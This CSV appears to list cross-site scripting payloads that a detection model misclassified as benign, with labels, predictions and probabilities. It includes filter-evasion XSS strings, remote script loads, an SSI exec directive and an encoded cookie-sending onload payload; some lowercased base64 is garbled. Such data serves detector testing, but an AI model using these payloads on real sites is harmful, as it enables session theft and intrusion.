Unnamed: 0,payload,label,pred,prob
341,header('location: '.$_get['param']);,1,0,0.037878004856950066
487,"<input value = """" type = text>",1,0,0.007143167300067013
593,<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=javascript:alert(1)>clickme,1,0,0.006298699434495315
596,document.documenturi,1,0,0.19114013929031004
663,document.url,1,0,0.182592180259323
673,"document.queryselector("".example"")",1,0,0.16415697428877582
1408,"document.getelementsbyclassname("""").length",1,0,0.18166860760533798
1588,<,1,0,0.006298699434495315
1664,"<script a="">'>"" src=""httx://.rocks/.js""></script>",1,0,0.13863243504517833
1686,"document.queryselector("".example"")",1,0,0.16415697428877582
2062,"b=""url(\"""";",1,0,0.0063691820953630345
2129,"document.queryselector("".example"")",1,0,0.16415697428877582
2480,"<script a="">"" '' src=""httx://.rocks/.js""></script>",1,0,0.13863243504517833
2501,"tt p://6 6.000146.0x7.147/""></a>",1,0,0.021145131748552187
2573,eval(a+b+c+d),1,0,0.011468354126671002
2607,"<a href=""//www.google.com/""></a>",1,0,0.15666870356379778
2830,datasrc=#i datafld=c dataformatas=html,1,0,0.008920840600154245
2884,writetitle(),1,0,0.010597420913031402
3044,<,1,0,0.006298699434495315
3141,"document.getelementsbyname("""")",1,0,0.17259888811671428
3543,"<script> settimeout(\\""writetitle()\\"",$\_get\[\]) </script>",1,0,0.1822894632938837
3645,"<embed src=""data:image/svg+xml;base64,phn2zyb4bwxuczpzdmc9imh0dh a6ly93d3cudzmub3jnlziwmdavc3zniib4bwxucz0iahr0cdovl3d3dy53my5vcmcv mjawmc9zdmciihhtbg5zonhsaw5rpsjodhrwoi8vd3d3lnczlm9yzy8xotk5l3hs aw5riib2zxjzaw9upsixljaiihg9ijaiihk9ijaiihdpzhropsixotqiighlawdodd0imjaw iibpzd0iehnzij48c2nyaxb0ihr5cgu9inrlehqvzwntyxnjcmlwdci+ywxlcnqoilh tuyipozwvc2nyaxb0pjwvc3znpg=="" type=""image/svg+xml"" allowscriptaccess=""always""></embed>",1,0,0.03350484061416489
3713,"document.getelementsbyclassname(""example"")",1,0,0.18166860760533798
3825,<script src=//.rocks/.j>,1,0,0.37212492679185144
4115,"<a href=""http://1113982867/""></a>",1,0,0.37487027955627994
4372,"document.queryselector("""")",1,0,0.16774797479473472
4605,top[“al”+”ert”](1),1,0,0.02947941643571121
4684,"<img onload=""eval(atob('zg9jdw1lbnqubg9jyxrpb249imh0dha6ly9saxn0zxjusvaviitkb2n1bwvudc5jb29rawu='))"">",1,0,0.01611828804682838
4860,"<a href=""http://0x42.0x0000066.0x7.0x93/""></a>",1,0,0.37487027955627994
4867,"<script a="">"" src=""httx://.rocks/.js""></script>",1,0,0.13863243504517833
4979,top[/al/.source+/ert/.source](1),1,0,0.02947941643571121
5117,"document.getelementsbyclassname("""").length",1,0,0.18166860760533798
5221,al\u0065rt(1),1,0,0.20151241378812668
5669,"R6<a href=""//google""></a>R6",1,0,0.01951044957591708
5698,0x42.0x0000066.0x7.0x93/,1,0,0.006298699434495315
5738,GG3ytop[‘al\x65rt’](1)GG3y,1,0,0.014763258787608981
5886,document.documenturi,1,0,0.19114013929031004
5947,"<script ="">"" src=""httx://.rocks/.js""></script>",1,0,0.13863243504517833
6001,document.documenturi,1,0,0.19114013929031004
6194,"document.getelementsbyname("""")",1,0,0.17259888811671428
6435,kyn428onfocus()kyn428,1,0,0.04628984075179579
6956,"document.getelementsbyclassname(""example"")",1,0,0.18166860760533798
7212,"document.queryselector("""")",1,0,0.16774797479473472
7581,"<script a=`>` src=""httx://.rocks/.js""></script>",1,0,0.13863243504517833
8204,document.documentelement.nodename,1,0,0.17383257254661819
8675,"a=""get"";",1,0,0.006298699434495315
8757,<,1,0,0.006298699434495315
9019,document.url,1,0,0.182592180259323
9044,document.documentelement.nodename,1,0,0.17383257254661819
9087,"document.getelementsbyname("""")",1,0,0.17259888811671428
9870,top[‘al\145rt’](1),1,0,0.014565787319716151
10026,x000003c,1,0,0.006298699434495315
10056,"<a href=""http://0102.0146.0007.00000223/""></a>",1,0,0.37487027955627994
10328,settimeout(,1,0,0.006298699434495315
10463,"rc=""data:image/svg+xml;base64,phn2zyb4bwxuczpzdmc9imh0dh a6ly93d3cudzmub3jnlziwmdavc3zniib4bwxucz0iahr0cdovl3d3dy53my5vcmcv mjawmc9zdmciihhtbg5zonhsaw5rpsjodhrwoi8vd3d3lnczlm9yzy8xotk5l3hs aw5riib2zxjzaw9upsixljaiihg9ijaiihk9ijaiihdpzhropsixotqiighlawdodd0imjaw iibpzd0iehnzij48c2nyaxb0ihr5cgu9inrlehqvzwntyxnjcmlwdci+ywxlcnqoilh tuyipozwvc2nyaxb0pjwvc3znpg=="" type=""image/svg+xml"" allowscriptaccess=""always""",1,0,0.03350484061416489
10523,"<!--#exec cmd=""/bin/echo '<scr'""-->",1,0,0.3977127327632963
10745,"/?param=<data:text/html;base64,phnjcmlwdd5hbgvydcgnwfntjyk8l3njcmlwdd4=",1,0,0.1859176704261801
10753,"src=""test.xml"" id=i",1,0,0.007168601378031343
10862,"document.getelementsbyclassname("""").length",1,0,0.18166860760533798
11208,"settimeout(\\""writetitle()\\"",$\_get\[\])",1,0,0.010597420913031402
11221,top[8680439..tostring(30)](1),1,0,0.014565787319716151
11364,document.url,1,0,0.182592180259323
11453,"=""background-image:\0075\0072\006c\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029",1,0,0.006298699434495315
11653,document.documentelement.nodename,1,0,0.17383257254661819
11673,"<img src=""livescript:[code]"">",1,0,0.12515894365861144
11679,"document.queryselector("""")",1,0,0.16774797479473472
11685,"allowscriptaccess=""always""",1,0,0.12622943585362353
11961,"< style=""behavior: url(.htc);"">",1,0,0.0067252156413763605
12214,"<span datasrc=""#"" datafld=""b"" dataformatas=""html""></span>",1,0,0.006925808700176364
12455,"eWrX1cadocument.getelementsbyclassname(""example"")eWrX1ca",1,0,0.1791447237915799
12645,"<script ""a='>'"" src=""httx://.rocks/.js""></script>",1,0,0.13863243504517833
12693,"exp/*<a style='no\:no(""*//*"");",1,0,0.008370652222532388
13064,"<img src=""x:gif"" onerror=""window['al\u0065rt'](0)""></img>",1,0,0.35233280797222394
13105,"<img src='vbscript:msgbox("""")'>",1,0,0.12515894365861144
13286,"?param=<data:text/html;base64,phnjcmlwdd5hbgvydcgnwfntjyk8l3njcmlwdd4=",1,0,0.1859176704261801
13439,"<div style=""background-image:\0075\0072\006c\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029"">",1,0,0.007822606024009292
13505,"<a href=""http://66.102.7.147/""></a>",1,0,0.37487027955627994
